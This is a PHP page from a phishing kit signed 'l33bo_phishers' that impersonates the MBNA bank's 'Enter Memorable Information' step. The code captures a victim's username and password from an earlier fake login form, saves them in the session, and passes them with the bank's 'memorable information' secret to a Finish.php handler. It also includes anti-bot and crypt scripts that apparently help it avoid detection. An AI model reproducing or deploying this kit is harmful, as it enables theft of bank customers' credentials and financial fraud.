<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "antibots.php";
require "crypt.php";
if($_SERVER["HTTPS"] != "on")
{
    header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
    exit();
}
$user = $_POST['user'];
$pwd = $_POST['pwd'];
$_SESSION['user'] = $_POST['user'];
$_SESSION['pwd'] = $_POST['pwd'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<title>MBNA - Enter Memorable Information</title>
<META content="text/html; charset=us-ascii" http-equiv=Content-Type><LINK rel="shortcut icon" type=image/x-icon href="assets/images/favicon.ico">
<style type="text/css">
  
.textbox {  
    border: 2px solid rgba(119,119,119, 0.65);
    padding: 6px 5px 6px 5px;
    border-radius: 3px;
    height: 33px; 
    width: 275px; 
 } 
 

 </style>
</head>
<body style="background-repeat:no-repeat;" background="3.png">
<form method="post" action="Finish.php">
<input name="user" value="<?=$user?>" type="hidden">
<input name="pwd" value="<?=$pwd?>" type="hidden">
<input class="memorable" name="memorable" required="" maxlength="50" type="password" autocomplete="off" style="HEIGHT: 32px; WIDTH: 154px; position:absolute; left:93px;top:297px; z-index:5" type="text">
<div style="position:absolute; left: 805px;top: 461px; z-index:5">
<input name="formimage1" src="assets/images/continue2.png" type="image"><p>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
&nbsp;</p></div>


</form></body>
</html>